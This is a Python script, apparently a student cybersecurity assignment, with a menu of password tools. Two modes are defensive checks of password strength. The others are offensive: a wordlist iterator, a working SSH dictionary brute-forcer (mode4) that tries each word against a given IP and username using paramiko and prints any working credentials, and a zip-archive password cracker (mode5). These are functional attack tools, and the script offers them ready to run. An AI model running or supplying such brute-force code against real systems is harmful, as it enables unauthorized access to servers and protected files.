#!/usr/bin/python3
# Nick Alderete
# Worked with Geneva and Sierra


# Sources: 
    # https://www.shiksha.com/online-courses/articles/validating-passwords-using-python-regex-match/
    # https://www.geeksforgeeks.org/password-validation-in-python/#   
    # https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
    # https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/#
    # https://www.linode.com/docs/guides/use-paramiko-python-to-ssh-into-a-server/
    # ChatGPT- for help with formatting and understanding paramiko
    # https://snyk.io/advisor/python/paramiko/example
    # https://docs.python.org/3/library/zipfile.html#module-zipfile
    # https://favtutor.com/blogs/zipfile-python
    # https://www.geeksforgeeks.org/how-to-brute-force-zip-file-passwords-in-python/


import time
import re 
import paramiko
import zipfile 
from zipfile import ZipFile


# Define functions:

# Offensive; Dictionary iterator
def mode1():
    # Ask user for wordlist file path
    filepath = input("Enter the file path of your dictionary:\n")
    
    # Open the file and read each line
    with open(filepath) as file:
        for line in file:
            word = line.strip()
            time.sleep(1)
            print(word)


# Defensive; Password recognition metrics            
def mode2():
    # Ask user for wordlist file path
    filepath = input("Enter the file path of your dictionary:\n")

    with open(filepath) as file:
        password_list = [line.strip() for line in file]
        
        # Ask user for password and check if it's in the list
        while True:
            password = input("Please enter your password: \n")
            if password in password_list:
                print("Your password is weak. Please beef it up and try again!")
            else:
                print("Your password is beefy enough!")
                break


# Defensive; Password complexity metrics
def mode3():
    # Ask user for password
    password = input("Please enter your password: \n")
        # Check if password meets length requirement
    if len(password) >= 6:
        length_check = True
    else:
        length_check = False
    
    # Check if password has at least 1 capital letter
    if re.search('[A-Z]', password):
        capital_check = True
    else:
        capital_check = False
    
    # Check if password has at least 2 numbers
    if len(re.findall('\d', password)) >= 2:
        number_check = True
    else:
        number_check = False
    
    # Check if password has at least 1 symbol
    if re.search('[^a-zA-Z0-9]', password):
        symbol_check = True
    else:
        symbol_check = False
    
    # Print which password complexity metrics were NOT satisfied
    # Print if password meets requirements 
    if length_check and capital_check and number_check and symbol_check:
        print("SUCCESS! Password meets beefy requirements.")
    else:
        print("Beefy password requirements NOT met.") 
        print("The following requirements MUST be met:\n")
        if not length_check:
            print("Please use at least 6 characters\n")
        if not capital_check:
            print("Please use at least 1 capital letter\n")
        if not number_check:
            print("Please use at least 2 numbers\n")
        if not symbol_check:
            print("Please use at least 1 symbol\n")


# Brute Force, SSH
def mode4():
    # Ask user for SSH server IP and username
    ip = input("Enter SSH server IP address: \n")
    username = input("Enter SSH username: \n")

    # Ask user for wordlist file path
    filepath = input("Enter the file path of your dictionary: \n")

    # Open the file and read each word
    with open(filepath, 'r') as file:
        for line in file:
            password = line.strip()

            # Create SSH client and try to connect
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                client.connect(hostname=ip, username=username, password=password)
            except paramiko.AuthenticationException:
                # Wrong password, try next one
                continue
            except Exception as e:
                # Unable to connect to SSH server
                print(f"Unable to connect to {ip}: {e}")
                break
            else:
                # Successful login
                print(f"Successfully logged in to {ip} as {username} with password: {password}")
                break
            finally:
                client.close()


# Zip File Password Cracker 
def mode5():
    # Get file paths for dictionary and zip files
    password_file = input("Enter the file path to the dictionary: \n")
    zip_file = input("Enter the file path to the zip file: \n")

    # Open the password file and read the passwords in a list
    with open(password_file, encoding="ISO-8859-1") as password_file:
        passwords = [password.strip() for password in password_file]

    # Create a ZipFile object using the zip file path
    with ZipFile(zip_file) as zip_object:

        for password in passwords:
            try:
                # Try to extract the files using list passwords
                zip_object.extractall(pwd=password.encode('utf-8'))
                print("\n!!!-Extraction successful-!!!")
                print(f"Password for zip file is: {password} \n")
                return True
            except:
                # If the password is incorrect, try the next one
                print("Incorrect password, trying new one... ")
        
        # Print failed message if password isn't found
        print("\n!!!-Failed, password was NOT found-!!!\n")
        return False


# User menu
while True:
    print("==MODE SELECTIONS==")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognition")
    print("3. Defensive; Password Complexity Checker")
    print("4. Brute Force; SSH")
    print("5. Zip File Password Cracker")
    print("6. Exit\n")
    
    answer = input("Please enter your selection (1-6): \n")
    
    if answer == "1":
        print("\n==Starting: Dictionary Iterator==\n")
        mode1()
        break
    elif answer == "2":
        print("\n==Starting: Password Recognition==\n")
        mode2()
        break
    elif answer == "3":
        print("\n==Starting: Password Complexity Checker==\n")
        mode3()
        break
    elif answer == "4":
        print("\n==Starting: Brute Force; SSH==\n")
        mode4()
        break
    elif answer == "5":
        print("\n==Starting: Zip File Password Cracker==\n")
        mode5()
    elif answer == "6":
        print("Exiting program...")
        time.sleep(2)
        break
    else:
        print("Invalid mode selection. Please try again.")

# END
